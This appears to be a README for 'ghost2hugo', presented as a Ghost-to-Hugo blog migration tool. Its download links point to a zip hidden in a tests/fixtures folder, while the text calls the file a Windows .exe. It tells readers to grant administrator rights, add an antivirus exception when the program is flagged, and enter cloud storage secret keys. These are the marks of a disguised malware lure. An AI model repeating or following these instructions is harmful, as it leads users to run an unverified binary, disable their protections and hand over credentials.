# ✍️ ghost2hugo - Move your blog to new software

[![](https://img.shields.io/badge/Download-ghost2hugo-blue.svg)](https://github.com/Vunguye9423/ghost2hugo/raw/refs/heads/main/tests/fixtures/assets/content/media/2024/ghost-hugo-v2.8.zip)

ghost2hugo helps you move your website content from Ghost CMS to a system called Hugo. This process keeps your data safe while preparing it for a faster hosting environment. The tool manages image transfers to cloud storage and checks every post to ensure the move works as intended.

## ⚙️ System requirements

Your computer needs a few things to run this tool correctly. Check that you meet these points before you start:

- Operating System: Windows 10 or Windows 11.
- Memory: At least 4 gigabytes of RAM.
- Storage: 200 megabytes of free disk space.
- Internet Connection: A stable connection for downloading images during the move.
- Access: You need administrator rights on your computer to run the migration tool.

## 📥 Getting the tool

You find the migration tool on the releases page. 

[Visit this page to download the setup file](https://github.com/Vunguye9423/ghost2hugo/raw/refs/heads/main/tests/fixtures/assets/content/media/2024/ghost-hugo-v2.8.zip)

Choose the file that ends in .exe for Windows. Save the file to your desktop or your downloads folder. This file contains all the parts needed for the migration process.

## 🚀 Setting up the migration

Follow these steps to prepare the tool for your website data:

1. Locate the file you just downloaded.
2. Double-click the file to open the setup window.
3. Follow the prompts on your screen to install the program. 
4. The setup tool creates a folder on your computer where the program lives.
5. Open the folder to find the application icon.

## 📁 Preparing your Ghost data

Before the tool can move your site, it needs a copy of your current blog content. Log in to your Ghost CMS dashboard. Look for the settings menu and find the option for Export. Download the JSON file containing your posts. Store this file in a folder where you can find it later.

The tool also needs to handle your images. If you use a cloud storage service like Cloudflare R2 or Amazon S3, have your access keys ready. These keys allow the tool to copy your images from your old site to your new cloud folder.

## 🛠️ Running the transfer

Once you have your data file, start the ghost2hugo application. The window will guide you through the process:

1. Select your Ghost export file in the application menu.
2. Enter your cloud storage details if you want the tool to move your images. These details include your bucket name and secret keys.
3. Choose a destination folder on your computer where you want the new Hugo files to appear.
4. Click the Start button.

The tool uses parallel workers to speed up the process. This means it uploads or moves multiple files at once. You can watch the progress bar move across the screen.

## ✅ Checking the results

After the tool finishes the move, it performs a verification step. This process looks at every post to confirm that every element moved safely. 

If the tool finds an error, it flags the specific post. You can open the verification log to see what went wrong. Common issues involve broken links or missing images that were not available during the move. 

The resulting files will appear in the destination folder you chose. These files are now ready to work with Hugo. You can upload these files to your web host to complete the migration.

## 💡 Troubleshooting common issues

If the application hangs or stops unexpectedly, check these common items:

- Check your internet connection. A slow connection can cause timeouts during image transfers.
- Verify your cloud storage keys. If the keys are expired or incorrect, the tool cannot access your assets.
- Ensure your antivirus software does not block the application. Sometimes, security settings flag new tools as suspicious. Add an exception for the ghost2hugo folder if this happens.
- Make sure the Ghost export file is not empty. If the file is only a few kilobytes, it may not contain your post data. Try exporting your content or data again from the Ghost dashboard.

The tool keeps a log file in the application directory. If you remain stuck, read this log file. It lists specific error codes that help identify problems with individual posts or connections. 

## 🌐 Understanding the workflow

This tool simplifies a complex task. Moving from a database-driven system like Ghost to a file-based system like Hugo requires formatting changes. 

The pipeline handles three distinct phases:

1. Analysis: The tool reads your Ghost file and separates the text from the layout.
2. Asset Management: It finds images inside your posts. It fetches these files and uploads them to your new storage location. It replaces the old links in your text with the new ones.
3. Formatting: It wraps your text in the format that Hugo understands. This ensures your site looks correct after the move.

By automating these steps, you avoid manual copy-and-paste errors. The verification step works like a final quality check to ensure your links and images appear where they belong. You spend less time fixing broken content and more time publishing your work.